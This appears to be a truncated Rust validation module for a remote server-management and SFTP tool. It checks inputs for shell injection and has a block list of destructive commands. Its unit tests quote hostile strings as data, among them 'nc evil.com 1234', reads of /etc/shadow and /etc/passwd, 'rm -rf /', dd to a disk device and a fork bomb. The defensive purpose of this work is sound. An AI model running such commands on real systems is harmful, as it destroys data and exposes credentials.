use serde::{Deserialize, Serialize};
use regex::Regex;
use std::sync::{LazyLock, RwLock};

// Pre-compiled regex patterns for performance
static SERVICE_NAME_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[a-zA-Z0-9._@-]+$").unwrap());
static BACKTICK_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"`.*`").unwrap());
static IPV4_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$").unwrap());
static IPV6_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(
    r"^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|::)$"
).unwrap());
static HOSTNAME_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(
    r"^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$"
).unwrap());
static CONTAINER_ID_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[a-zA-Z0-9][a-zA-Z0-9._-]{0,127}$").unwrap());
static PERMISSION_MODE_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[0-7]{3,4}$").unwrap());
/// SFTP 断点续传临时文件名后缀模式：.sw-(upload|dl)-tmp-<uuid-v4>
/// 用于校验前端传入的 tmp_path 是否合法，防止恶意调用者传入任意路径删除/重命名文件
static TMP_FILE_NAME_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\.sw-(?:upload|dl)-tmp-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$").unwrap()
});

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ValidationResult {
    pub valid: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

impl ValidationResult {
    pub fn ok() -> Self {
        ValidationResult {
            valid: true,
            error: None,
        }
    }

    pub fn err(msg: impl Into<String>) -> Self {
        ValidationResult {
            valid: false,
            error: Some(msg.into()),
        }
    }
}

/// Validates service names for systemd
/// Allowed: alphanumeric, dash, underscore, dot, @
/// Pattern: ^[a-zA-Z0-9._@-]+$
/// Max length: 256 characters
///
/// Matches JS: validateServiceName()
pub fn validate_service_name(name: String) -> ValidationResult {
    if name.is_empty() {
        return ValidationResult::err("Service name is required and must be a string");
    }

    if name.len() > 256 {
        return ValidationResult::err(format!(
            "Service name exceeds maximum length of 256 characters (current: {})",
            name.len()
        ));
    }

    if !SERVICE_NAME_RE.is_match(&name) {
        return ValidationResult::err(
            "Invalid service name: only alphanumeric characters, dash, underscore, dot, and @ are allowed",
        );
    }

    ValidationResult::ok()
}

/// Validates hostname or IP address
/// Hostname: RFC 1123 compliant (alphanumeric, dash, dot)
/// IPv4: xxx.xxx.xxx.xxx (0-255 each octet)
/// IPv6: standard notation
/// Max length: 253 characters for hostname
///
/// Matches JS: validateHostOrIP()
pub fn validate_host_or_ip(target: String) -> ValidationResult {
    if target.is_empty() {
        return ValidationResult::err("Host or IP address is required and must be a string");
    }

    if target.len() > 253 {
        return ValidationResult::err(format!(
            "Hostname exceeds maximum length of 253 characters (current: {})",
            target.len()
        ));
    }

    // Check for dangerous characters that could enable injection
    let dangerous_chars = [';', '|', '&', '$', '`', '\n', '>', '<', '(', ')', '{', '}', '\\', '\0'];
    for &char in &dangerous_chars {
        if target.contains(char) {
            return ValidationResult::err("Invalid host or IP: contains prohibited characters");
        }
    }

    // Check for command substitution patterns
    if target.contains("$(") {
        return ValidationResult::err("Invalid host or IP: contains command substitution pattern");
    }
    if BACKTICK_RE.is_match(&target) {
        return ValidationResult::err("Invalid host or IP: contains command substitution pattern");
    }

    // IPv4 validation
    if let Some(caps) = IPV4_RE.captures(&target) {
        for i in 1..=4 {
            if let Some(m) = caps.get(i) {
                if let Ok(num) = m.as_str().parse::<u32>() {
                    if num > 255 {
                        return ValidationResult::err(
                            "Invalid IPv4 address: octets must be 0-255",
                        );
                    }
                }
            }
        }
        return ValidationResult::ok();
    }

    // IPv6 validation (basic pattern check) - same pattern as JS
    if IPV6_RE.is_match(&target) {
        return ValidationResult::ok();
    }

    // RFC 1123 hostname validation
    if HOSTNAME_RE.is_match(&target) {
        return ValidationResult::ok();
    }

    ValidationResult::err("Invalid host or IP: must be a valid hostname or IP address")
}

/// Validates process ID
/// Must be positive integer
/// Range: 1 to 2^31-1 (max PID on Linux)
///
/// Matches JS: validatePID()
pub fn validate_pid(pid: String) -> ValidationResult {
    if pid.is_empty() {
        return ValidationResult::err("PID is required");
    }

    // Check for dangerous characters
    let dangerous_chars = [';', '|', '&', '$', '`', '\n', '>', '<', '(', ')', '{', '}', '\\', '\0', ' '];
    for &char in &dangerous_chars {
        if pid.contains(char) {
            return ValidationResult::err("Invalid PID: contains prohibited characters");
        }
    }

    // Check for command substitution
    if pid.contains("$(") {
        return ValidationResult::err("Invalid PID: contains command substitution pattern");
    }
    if BACKTICK_RE.is_match(&pid) {
        return ValidationResult::err("Invalid PID: contains command substitution pattern");
    }

    // Must be numeric
    let pid_num: i64 = match pid.parse() {
        Ok(n) => n,
        Err(_) => return ValidationResult::err("Invalid PID: must be an integer"),
    };

    // Must be positive
    if pid_num <= 0 {
        return ValidationResult::err("Invalid PID: must be positive");
    }

    // Max PID on Linux is 2^31-1
    const MAX_PID: i64 = 2147483647;
    if pid_num > MAX_PID {
        return ValidationResult::err(format!("Invalid PID: exceeds maximum value of {}", MAX_PID));
    }

    ValidationResult::ok()
}

/// Validates Docker container ID or name
/// Full ID: 64 hex characters
/// Short ID: 12+ hex characters
/// Name: alphanumeric, dash, underscore, dot (must start with alphanumeric)
/// Pattern: ^[a-zA-Z0-9][a-zA-Z0-9._-]{0,127}$
///
/// Matches JS: validateContainerId()
pub fn validate_container_id(id: String) -> ValidationResult {
    if id.is_empty() {
        return ValidationResult::err("Container ID is required and must be a string");
    }

    if id.len() > 128 {
        return ValidationResult::err(format!(
            "Container ID exceeds maximum length of 128 characters (current: {})",
            id.len()
        ));
    }

    // Check for dangerous characters
    let dangerous_chars = [';', '|', '&', '$', '`', '\n', '>', '<', '(', ')', '{', '}', '\\', '\0', ' '];
    for &char in &dangerous_chars {
        if id.contains(char) {
            return ValidationResult::err("Invalid container ID: contains prohibited characters");
        }
    }

    // Check for command substitution
    if id.contains("$(") {
        return ValidationResult::err("Invalid container ID: contains command substitution pattern");
    }
    if BACKTICK_RE.is_match(&id) {
        return ValidationResult::err("Invalid container ID: contains command substitution pattern");
    }

    // Pattern: must start with alphanumeric, then can contain alphanumeric, dash, underscore, dot
    if !CONTAINER_ID_RE.is_match(&id) {
        return ValidationResult::err(
            "Invalid container ID: must start with alphanumeric and contain only alphanumeric, dash, underscore, or dot",
        );
    }

    ValidationResult::ok()
}

/// Validates file/directory paths
/// Checks for:
///   - Directory traversal (.. sequences)
///   - Null bytes (\0)
///   - Command substitution ($(), ``)
///   - Shell metacharacters that could enable injection
///
/// Matches JS: validatePath()
///
/// 默认按 Linux 路径规则校验（以 `/` 开头）。若需校验 Windows 路径（如 `C:\Users\...`），
/// 请使用 [`validate_path_for_target`] 并传入目标类型。
pub fn validate_path(path: String, allow_traversal: bool) -> ValidationResult {
    validate_path_inner(&path, allow_traversal, false)
}

/// 按连接目标类型校验路径。
///
/// - `target_type` 为 `windows` 时允许 Windows 盘符路径（如 `C:\Users\...`、`D:\`），
///   使用 `\` 或 `/` 作为分隔符均可。
/// - 其余目标类型（linux/unix/...）沿用 POSIX 绝对路径规则（以 `/` 开头）。
///
/// 安全约束与 [`validate_path`] 一致：拒绝目录穿越（除非 allow_traversal）、
/// null 字节、命令替换、shell 元字符、控制字符。
pub fn validate_path_for_target(path: String, allow_traversal: bool, target_type: &str) -> ValidationResult {
    let is_windows = target_type.eq_ignore_ascii_case("windows");
    validate_path_inner(&path, allow_traversal, is_windows)
}

pub fn validate_path_inner(path: &str, allow_traversal: bool, is_windows: bool) -> ValidationResult {
    if path.is_empty() {
        return ValidationResult::err("Path is required and must be a string");
    }

    // Check for null bytes
    if path.contains('\0') {
        return ValidationResult::err("Invalid path: contains null byte");
    }

    if is_windows {
        // Windows 路径校验：允许盘符路径（如 C:\Users\... 或 C:/Users/...）和 UNC 路径（\\server\share）
        if !is_windows_absolute_path(path) {
            return ValidationResult::err("Invalid path: must be an absolute Windows path (e.g. 'C:\\Users\\...' or '\\\\server\\share')");
        }
        // Windows 路径分隔符可能是 \ 或 /，统一按两者切分检查 ..
        if !allow_traversal && path.replace('\\', "/").split('/').any(|seg| seg == "..") {
            return ValidationResult::err("Invalid path: directory traversal not allowed");
        }
    } else {
        // 强制要求绝对路径（以 / 开头），相对路径会依赖远程 cwd，行为不可预测
        if !path.starts_with('/') {
            return ValidationResult::err("Invalid path: must be an absolute path starting with '/'");
        }
        // Check for directory traversal (unless explicitly allowed).
        if !allow_traversal && path.split('/').any(|seg| seg == "..") {
            return ValidationResult::err("Invalid path: directory traversal not allowed");
        }
    }

    // Check for command substitution
    if path.contains("$(") {
        return ValidationResult::err("Invalid path: contains command substitution pattern");
    }
    if BACKTICK_RE.is_match(path) {
        return ValidationResult::err("Invalid path: contains command substitution pattern");
    }

    // Check for shell metacharacters and control characters that could enable injection
    // 或导致命令解析异常。扩展范围覆盖 \r \t 等控制字符（defense-in-depth，即便
    // escape_shell_arg 单引号保护下这些字符字面化，仍拒绝可疑输入）
    let dangerous_chars = [';', '|', '&', '\n', '\r', '\t', '\x0b', '\x0c'];
    for &char in &dangerous_chars {
        if path.contains(char) {
            return ValidationResult::err("Invalid path: contains prohibited characters");
        }
    }

    // 拒绝其他 ASCII 控制字符（0x01-0x1f，0x7f-0x9f），与前端 validateFileName 对齐
    if path.chars().any(|c| c.is_control() && c != '\0' ) {
        return ValidationResult::err("Invalid path: contains control characters");
    }

    ValidationResult::ok()
}

/// 判断是否为 Windows 绝对路径：
/// - 盘符路径：`C:\` 或 `C:/`（盘符不区分大小写）
/// - UNC 路径：`\\server\share` 或 `//server/share`
fn is_windows_absolute_path(path: &str) -> bool {
    // 盘符路径：长度 >= 3，形如 `X:\` 或 `X:/`
    if path.len() >= 3 {
        let bytes = path.as_bytes();
        if bytes[0].is_ascii_alphabetic() && bytes[1] == b':' && (bytes[2] == b'\\' || bytes[2] == b'/') {
            return true;
        }
    }
    // POSIX 形式的 Windows 路径：`/X:/...`（前端统一用此形式传输 Windows 路径）
    // 形如 /C:/Users/... 或 /D:/foo，长度 >= 4
    if path.len() >= 4 {
        let bytes = path.as_bytes();
        if bytes[0] == b'/' && bytes[1].is_ascii_alphabetic() && bytes[2] == b':' && (bytes[3] == b'\\' || bytes[3] == b'/') {
            return true;
        }
    }
    // UNC 路径：`\\` 或 `//` 开头
    if path.starts_with("\\\\") || path.starts_with("//") {
        return true;
    }
    false
}

/// 临时路径校验用的路径归一化（仅用于比较，不改变实际使用的路径）。
///
/// Windows 目标的 tmp 与 target 可能来自不同来源、采用不同形式：
/// - tmp 来自后端进度事件：盘符正斜杠形式 `C:/Users/...`
/// - target 来自前端导航记录：POSIX 形式 `/C:/Users/...`
/// - 或混用反斜杠 `C:\Users\...`
///   逐字符 `starts_with` 会因分隔符/前导斜杠差异永远不成立（续传必然失败）。
///   归一规则：反斜杠统一为正斜杠；`/C:/...` 去掉盘符前的前导斜杠（与 `C:/...` 等价）。
fn normalize_tmp_compare(path: &str) -> String {
    let s = path.replace('\\', "/");
    let b = s.as_bytes();
    if s.len() >= 3 && b[0] == b'/' && b[1].is_ascii_alphabetic() && b[2] == b':' {
        s[1..].to_string()
    } else {
        s
    }
}

/// 校验 SFTP 断点续传临时文件路径是否合法
///
/// 安全约束（防止恶意前端传入任意路径删除/重命名文件）：
/// 1. 路径不能为空，不能含 null 字节
/// 2. 文件名必须匹配 `.sw-(upload|dl)-tmp-<uuid-v4>`，或 Windows 原生传输使用的
///    `<target>.uploading` / `<target>.downloading` 临时后缀
/// 3. 如果提供 target_path，临时路径必须以 target_path + ".sw-" 开头（同目录约束）
///
/// 调用方额外责任：
/// - 远程路径需调用 `is_dangerous_root_path` 检查
/// - `offset` 需调用方做上限校验（`offset <= source_file_size`）
pub fn validate_tmp_path(tmp_path: &str, target_path: Option<&str>) -> ValidationResult {
    if tmp_path.is_empty() {
        return ValidationResult::err("Temporary file path is required");
    }

    if tmp_path.contains('\0') {
        return ValidationResult::err("Invalid temporary path: contains null byte");
    }

    // 如果提供 target_path，做严格同目录校验
    // 防止攻击者用任意路径作为 tmp_path 触发 rename/remove
    // 比较前先归一化（分隔符/盘符前导斜杠），否则 Windows 目标因形式不一致必然失败
    if let Some(target) = target_path {
        if target.is_empty() {
            return ValidationResult::err("Target path is required for strict tmp validation");
        }
        let tmp_norm = normalize_tmp_compare(tmp_path);
        let target_norm = normalize_tmp_compare(target);
        if !tmp_norm.starts_with(&target_norm) {
            return ValidationResult::err(format!(
                "Invalid temporary path: must be derived from target path '{}'",
                target
            ));
        }
        let suffix = &tmp_norm[target_norm.len()..];
        if !suffix.starts_with(".sw-") && suffix != ".uploading" && suffix != ".downloading" {
            return ValidationResult::err(
                "Invalid temporary path: expected '.sw-' or Windows transfer suffix immediately after target path"
            );
        }
    }

    // 文件名必须匹配受控的临时文件格式。Windows 传输模块使用固定后缀，
    // 但仍要求前面存在真实目标路径，避免把任意普通文件当作临时文件删除。
    let normalized = tmp_path.replace('\\', "/");
    let file_name = normalized.rsplit('/').next().unwrap_or_default();
    let windows_tmp = [".uploading", ".downloading"].iter().any(|suffix| {
        file_name.ends_with(suffix) && file_name.len() > suffix.len()
    });
    if !TMP_FILE_NAME_RE.is_match(tmp_path) && !windows_tmp {
        return ValidationResult::err(
            "Invalid temporary path: filename must match a supported SFTP temporary-file pattern"
        );
    }

    ValidationResult::ok()
}

/// Validates chmod permission mode
/// Octal: 3-4 digits, each 0-7
/// Pattern: ^[0-7]{3,4}$
///
/// Matches JS: validatePermissionMode()
pub fn validate_permission_mode(mode: String) -> ValidationResult {
    if mode.is_empty() {
        return ValidationResult::err("Permission mode is required and must be a string");
    }

    // Check for dangerous characters
    let dangerous_chars = [';', '|', '&', '$', '`', '\n', '>', '<', '(', ')', '{', '}', '\\', '\0', ' '];
    for &char in &dangerous_chars {
        if mode.contains(char) {
            return ValidationResult::err("Invalid permission mode: contains prohibited characters");
        }
    }

    // Pattern: 3-4 octal digits (0-7)
    if !PERMISSION_MODE_RE.is_match(&mode) {
        return ValidationResult::err("Invalid permission mode: must be 3-4 octal digits (0-7)");
    }

    ValidationResult::ok()
}

/// Validates network port
/// Must be integer 1-65535
///
/// Matches JS: validatePort()
pub fn validate_port(port: String) -> ValidationResult {
    if port.is_empty() {
        return ValidationResult::err("Port is required");
    }

    // Check for dangerous characters
    let dangerous_chars = [';', '|', '&', '$', '`', '\n', '>', '<', '(', ')', '{', '}', '\\', '\0', ' '];
    for &char in &dangerous_chars {
        if port.contains(char) {
            return ValidationResult::err("Invalid port: contains prohibited characters");
        }
    }

    // Check for command substitution
    if port.contains("$(") {
        return ValidationResult::err("Invalid port: contains command substitution pattern");
    }
    if BACKTICK_RE.is_match(&port) {
        return ValidationResult::err("Invalid port: contains command substitution pattern");
    }

    // Must be numeric
    let port_num: u32 = match port.parse() {
        Ok(n) => n,
        Err(_) => return ValidationResult::err("Invalid port: must be an integer"),
    };

    // Must be in valid port range (1-65535)
    if !(1..=65535).contains(&port_num) {
        return ValidationResult::err("Invalid port: must be between 1 and 65535");
    }

    ValidationResult::ok()
}

/// Validates search keywords for grep
/// Rejects shell metacharacters that could break out of quotes
/// Dangerous chars: backticks, $(), newlines, null bytes, semicolons, pipes, etc.
///
/// Matches JS: validateKeyword()
pub fn validate_keyword(keyword: String) -> ValidationResult {
    if keyword.is_empty() {
        return ValidationResult::err("Keyword is required and must be a string");
    }

    // Check for null bytes
    if keyword.contains('\0') {
        return ValidationResult::err("Invalid keyword: contains null byte");
    }

    // Check for command substitution
    if keyword.contains("$(") {
        return ValidationResult::err("Invalid keyword: contains command substitution pattern");
    }
    if BACKTICK_RE.is_match(&keyword) {
        return ValidationResult::err("Invalid keyword: contains command substitution pattern");
    }

    // Check for shell metacharacters that could enable injection
    // These are especially dangerous in grep contexts
    let dangerous_chars = [';', '|', '&', '\n', '`', '$'];
    for &char in &dangerous_chars {
        if keyword.contains(char) {
            return ValidationResult::err("Invalid keyword: contains prohibited characters");
        }
    }

    ValidationResult::ok()
}

/// Escapes shell arguments using POSIX shell escaping
/// Wraps arguments in single quotes and escapes embedded quotes
/// Strips null bytes to prevent argument truncation attacks
/// Used as a last defense layer after validation
///
/// Matches JS: escapeShellArg()
pub fn escape_shell_arg(arg: String) -> String {
    // Strip null bytes - they can truncate arguments in shell
    let cleaned: String = arg.replace('\0', "");
    // Simple shell escaping for POSIX shells
    // Wrap in single quotes and escape any single quotes
    // Replace single quotes with '\'' (end quote, escaped quote, start quote)
    let escaped = cleaned.replace('\'', "'\\''");
    format!("'{}'", escaped)
}

/// 为 PowerShell 转义路径参数。
///
/// PowerShell 单引号字符串内所有字符都是字面量（除单引号本身需写成 `''` 转义）。
/// 这与 POSIX shell 的单引号语义一致，但用 PowerShell 语法包装。
///
/// 安全约束：
/// - 先剥离 null 字节，防止参数截断
/// - 用单引号包裹整个字符串，内部单引号转义为 `''`
/// - 与 [`escape_shell_arg`] 的区别仅在于语义上下文（PowerShell vs POSIX shell）
///
/// 调用方仍需在拼接命令前用 [`validate_path_for_target`] 校验路径合法性。
pub fn escape_powershell_arg(arg: String) -> String {
    let cleaned: String = arg.replace('\0', "");
    // PowerShell 单引号转义：' → ''
    let escaped = cleaned.replace('\'', "''");
    format!("'{}'", escaped)
}

/// 构建 Windows PowerShell 命令：使用 -EncodedCommand 传递 Base64 编码的脚本。
///
/// 解决问题：当远端默认 shell 已是 PowerShell 时，`powershell -Command "..."` 会嵌套调用，
/// 外层 PowerShell 会先解析双引号内的 `$_`、`$name` 等变量，导致脚本逻辑错乱。
/// 使用 -EncodedCommand 把脚本以 UTF-16LE Base64 编码传递，绕过所有 shell 解析。
///
/// 跨 shell 调用方案（通过 `cmd /c` 中转）：
/// - 远端 shell 为 cmd / PowerShell 时：`powershell` 在 PATH 中，直接调用成功。
/// - 远端 shell 为 Git Bash / MSYS2 / Cygwin 时：`powershell` 不在 bash 的 PATH 中，
///   但 `cmd` 在 PATH 中（Git Bash 继承 Windows System32 路径）。通过 `cmd /c` 中转，
///   cmd 使用 Windows 系统 PATH 找到 `powershell.exe`。
/// - Base64 字符串只含 `[A-Za-z0-9+/=]`，不含 `$` `` ` `` `\` 等 shell 元字符，
///   bash 不会对双引号内的 Base64 做任何展开，安全传递给 cmd。
///
/// 重要：不使用双引号包裹 cmd /c 的参数。
/// 原因：当 Windows OpenSSH DefaultShell 设为 PowerShell 时，OpenSSH 会用
/// `powershell.exe -Command "& { <用户命令> }"` 包装执行。如果用户命令含双引号，
/// PowerShell 会进行二次解析，把 `-NoProfile` 等参数误解为独立命令名。
/// Base64 不含空格和特殊字符，无需引号保护，直接作为裸参数传递即可。
pub fn build_powershell_command(script: &str) -> String {
    use base64::{Engine, engine::general_purpose};
    // PowerShell -EncodedCommand 要求 UTF-16LE 编码
    let utf16: Vec<u8> = script
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let encoded = general_purpose::STANDARD.encode(&utf16);
    // 跨 shell 调用通过 cmd.exe 中转：
    // 使用 Windows 原生反斜杠路径，避免正斜杠在 cmd.exe 中的解析问题
    // 不用双引号包裹：Base64 不含空格/特殊字符，避免 DefaultShell=PowerShell 时的双引号嵌套问题
    format!(
        "C:\\Windows\\System32\\cmd.exe /c powershell.exe -NoProfile -NonInteractive -EncodedCommand {}",
        encoded
    )
}

/// Pre-compiled regex patterns for destructive command detection.
static RM_RF_ROOT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)\brm\s+(?:-[a-zA-Z]*r[a-zA-Z]*f?|-[a-zA-Z]*f[a-zA-Z]*r?)\s+/(?:\s|$|\*)"#).unwrap()
});
static MKFS_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)\bmkfs(?:\.\w+)?\s+/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+|disk\d+)"#).unwrap()
});
static DD_TO_DISK_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)\bdd\b.*\bof\s*=\s*/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+|disk\d+)"#).unwrap()
});
static FORK_BOMB_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;"#).unwrap()
});
static CHMOD_ROOT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)\bchmod\s+(?:-[a-zA-Z]*R[a-zA-Z]*\s+)?[0-7]{3,4}\s+/['"]?\s*$"#).unwrap()
});

/// Validates a shell command before execution on a remote server.
///
/// This is a defense-in-depth layer that rejects obviously destructive
/// commands (e.g. `rm -rf /`, `mkfs /dev/sda`, fork bombs). It does NOT
/// replace proper input validation for specific handlers — it only catches
/// catastrophic commands that should never be executed regardless of context.
pub fn validate_command(command: String) -> ValidationResult {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return ValidationResult::err("Command is empty");
    }

    // Reject null bytes — they can truncate commands in shell
    if command.contains('\0') {
        return ValidationResult::err("Command contains null bytes");
    }

    // Destructive pattern checks
    if RM_RF_ROOT_RE.is_match(&command) {
        return ValidationResult::err(
            "Blocked: recursive deletion of root filesystem ('rm -rf /')"
        );
    }
    if MKFS_RE.is_match(&command) {
        return ValidationResult::err(
            "Blocked: filesystem format on disk device ('mkfs /dev/...')"
        );
    }
    if DD_TO_DISK_RE.is_match(&command) {
        return ValidationResult::err(
            "Blocked: raw write to disk device ('dd of=/dev/...')"
        );
    }
    if FORK_BOMB_RE.is_match(&command) {
        return ValidationResult::err("Blocked: fork bomb pattern detected");
    }
    if CHMOD_ROOT_RE.is_match(&command) {
        return ValidationResult::err(
            "Blocked: recursive permission change on root ('chmod -R ... /')"
        );
    }

    ValidationResult::ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_service_name_valid() {
        assert!(validate_service_name("nginx".to_string()).valid);
        assert!(validate_service_name("docker.service".to_string()).valid);
        assert!(validate_service_name("user@1000".to_string()).valid);
        assert!(validate_service_name("my-service".to_string()).valid);
    }

    #[test]
    fn test_validate_service_name_invalid() {
        assert!(!validate_service_name("".to_string()).valid);
        assert!(!validate_service_name("nginx!@#".to_string()).valid);
        assert!(!validate_service_name("my service".to_string()).valid);
        let long_name = "a".repeat(257);
        assert!(!validate_service_name(long_name).valid);
    }

    #[test]
    fn test_validate_host_or_ip_valid() {
        assert!(validate_host_or_ip("google.com".to_string()).valid);
        assert!(validate_host_or_ip("api.example.com".to_string()).valid);
        assert!(validate_host_or_ip("my-server.local".to_string()).valid);
        assert!(validate_host_or_ip("192.168.1.1".to_string()).valid);
        assert!(validate_host_or_ip("8.8.8.8".to_string()).valid);
        assert!(validate_host_or_ip("localhost".to_string()).valid);
    }

    #[test]
    fn test_validate_host_or_ip_injection() {
        let result = validate_host_or_ip("google.com; cat /etc/shadow".to_string());
        assert!(!result.valid);
        assert!(result.error.unwrap().contains("prohibited characters"));

        let result = validate_host_or_ip("8.8.8.8 | nc evil.com 1234".to_string());
        assert!(!result.valid);
    }

    #[test]
    fn test_validate_pid_valid() {
        assert!(validate_pid("1234".to_string()).valid);
        assert!(validate_pid("1".to_string()).valid);
        assert!(validate_pid("2147483647".to_string()).valid);
    }

    #[test]
    fn test_validate_pid_injection() {
        let result = validate_pid("1234; rm -rf /".to_string());
        assert!(!result.valid);
    }

    #[test]
    fn test_validate_container_id_valid() {
        assert!(validate_container_id("abc123def456".to_string()).valid);
        assert!(validate_container_id("my-container".to_string()).valid);
    }

    #[test]
    fn test_validate_path_valid() {
        assert!(validate_path("/var/log/nginx.log".to_string(), false).valid);
    }

    #[test]
    fn test_validate_path_traversal() {
        let result = validate_path("/var/log/../../etc/passwd".to_string(), false);
        assert!(!result.valid);
        assert!(result.error.unwrap().contains("directory traversal"));

        // With allowTraversal=true, should pass
        assert!(validate_path("/var/log/../../etc/passwd".to_string(), true).valid);
    }

    #[test]
    fn test_validate_path_double_dot_in_filename() {
        // `..` inside a filename (not a path segment) should be allowed
        assert!(validate_path("/var/log/myapp..backup".to_string(), false).valid);
        assert!(validate_path("/home/user/report..draft.txt".to_string(), false).valid);
        // But `..` as a real path segment is still rejected
        assert!(!validate_path("/var/../etc".to_string(), false).valid);
        assert!(!validate_path("../etc/passwd".to_string(), false).valid);
        assert!(!validate_path("/var/log/..".to_string(), false).valid);
    }

    #[test]
    fn test_validate_sftp_tmp_path_supports_windows_suffixes() {
        assert!(validate_tmp_path("/remote/file.txt.sw-upload-tmp-550e8400-e29b-41d4-a716-446655440000", None).valid);
        assert!(validate_tmp_path("C:/remote/file.txt.uploading", Some("C:/remote/file.txt")).valid);
        assert!(validate_tmp_path("C:/remote/file.txt.downloading", Some("C:/remote/file.txt")).valid);
        assert!(!validate_tmp_path("C:/remote/file.txt.bak", Some("C:/remote/file.txt")).valid);
    }

    #[test]
    fn test_validate_permission_mode_valid() {
        assert!(validate_permission_mode("644".to_string()).valid);
        assert!(validate_permission_mode("755".to_string()).valid);
        assert!(validate_permission_mode("1755".to_string()).valid);
    }

    #[test]
    fn test_validate_port_valid() {
        assert!(validate_port("80".to_string()).valid);
        assert!(validate_port("443".to_string()).valid);
        assert!(validate_port("65535".to_string()).valid);
    }

    #[test]
    fn test_validate_port_invalid() {
        assert!(!validate_port("0".to_string()).valid);
        assert!(!validate_port("65536".to_string()).valid);
    }

    #[test]
    fn test_validate_keyword_valid() {
        assert!(validate_keyword("error".to_string()).valid);
        assert!(validate_keyword("warning".to_string()).valid);
    }

    #[test]
    fn test_validate_keyword_injection() {
        let result = validate_keyword("\"; rm -rf /".to_string());
        assert!(!result.valid);

        let result = validate_keyword("error\n$(cat /etc/passwd)".to_string());
        assert!(!result.valid);
    }

    #[test]
    fn test_escape_shell_arg() {
        assert_eq!(escape_shell_arg("normal".to_string()), "'normal'");
        assert_eq!(escape_shell_arg("has space".to_string()), "'has space'");
        assert_eq!(escape_shell_arg("has'quote".to_string()), "'has'\\''quote'");
    }

    #[test]
    fn test_validate_command_valid() {
        assert!(validate_command("cat /proc/stat".to_string()).valid);
        assert!(validate_command("systemctl list-units --type=service".to_string()).valid);
        assert!(validate_command("df -Pk".to_string()).valid);
        assert!(validate_command("ps -eo state".to_string()).valid);
        assert!(validate_command("tail -n 100 /var/log/syslog".to_string()).valid);
        assert!(validate_command("rm -rf /tmp/test".to_string()).valid);
    }

    #[test]
    fn test_validate_command_empty() {
        assert!(!validate_command("".to_string()).valid);
        assert!(!validate_command("   ".to_string()).valid);
    }

    #[test]
    fn test_validate_command_null_bytes() {
        assert!(!validate_command("cat /proc/stat\0; rm -rf /".to_string()).valid);
    }

    #[test]
    fn test_validate_command_rm_rf_root() {
        assert!(!validate_command("rm -rf /".to_string()).valid);
        assert!(!validate_command("rm -rf /*".to_string()).valid);
        assert!(!validate_command("rm -fr /".to_string()).valid);
        assert!(!validate_command("sudo rm -rf /".to_string()).valid);
    }

    #[test]
    fn test_validate_command_mkfs() {
        assert!(!validate_command("mkfs /dev/sda".to_string()).valid);
        assert!(!validate_command("mkfs.ext4 /dev/nvme0n1".to_string()).valid);
        assert!(!validate_command("mkfs /dev/vda".to_string()).valid);
    }

    #[test]
    fn test_validate_command_dd_to_disk() {
        assert!(!validate_command("dd if=/dev/zero of=/dev/sda".to_string()).valid);
        assert!(!validate_command("dd if=/dev/zero of=/dev/nvme0n1 bs=1M".to_string()).valid);
    }

    #[test]
    fn test_validate_command_fork_bomb() {
        assert!(!validate_command(":(){ :|: & };:".to_string()).valid);
    }
}

pub const DEFAULT_IGNORE_PATTERNS: &[&str] = &[
    ".git",
    "node_modules",
    ".DS_Store",
    "thumbs.db",
    "__pycache__",
    ".idea",
    ".vscode",
];

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ExclusionConfig {
    pub enabled: bool,
    pub patterns: Vec<String>,
    pub respect_gitignore: bool,
    #[serde(default)]
    pub include_patterns: Vec<String>,
    #[serde(default)]
    pub min_size_bytes: Option<u64>,
    #[serde(default)]
    pub max_size_bytes: Option<u64>,
    #[serde(default)]
    pub min_mtime_ms: Option<i64>,
    #[serde(default)]
    pub max_mtime_ms: Option<i64>,
    #[serde(default)]
    pub file_kinds: Vec<String>,
}

impl Default for ExclusionConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            patterns: DEFAULT_IGNORE_PATTERNS.iter().map(|s| s.to_string()).collect(),
            respect_gitignore: false,
            include_patterns: Vec::new(),
            min_size_bytes: None,
            max_size_bytes: None,
            min_mtime_ms: None,
